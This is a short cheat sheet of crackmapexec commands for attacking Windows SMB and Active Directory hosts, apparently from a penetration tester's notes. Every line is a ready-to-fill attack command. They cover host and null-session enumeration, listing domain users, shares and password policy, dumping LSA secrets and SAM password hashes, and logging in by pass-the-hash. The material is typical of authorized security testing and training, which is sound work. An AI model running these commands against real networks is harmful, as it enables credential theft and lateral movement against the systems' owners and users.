```bash
$ crackmapexec smb <IP>[/mask] # host discovery and enumeration
$ crackmapexec smb <targets_file> # scan hosts from file  
$ crackmapexec smb <IP>[/mask]  -u "" -p "" # check smb null sesion login
$ crackmapexec smb <IP>[/mask]  -u <user> -p <passwd> --users # get list of all users in domain
$ crackmapexec smb <IP>[/mask]  -u <user> -p <passwd> --pas-pol # password policy
$ crackmapexec smb <IP>[/mask]  -u <user> -p <passwd> --shares # enumerate shares
$ crackmapexec smb <IP>[/mask]  -u <user> -p <passwd> --loggedon-users # check act ive sessions on machine
$ crackmapexec smb <IP>[/mask]  -u <user> -p <passwd> --lsa # get local security authority
$ crackmapexec smb <IP>[/mask]  -u <user> -p <passwd> --sam # get users and hashes
$ crackmapexec smb <IP>[/mask]  -u <user> -H <NT_hash> -d <./domain> # PasstheHash
```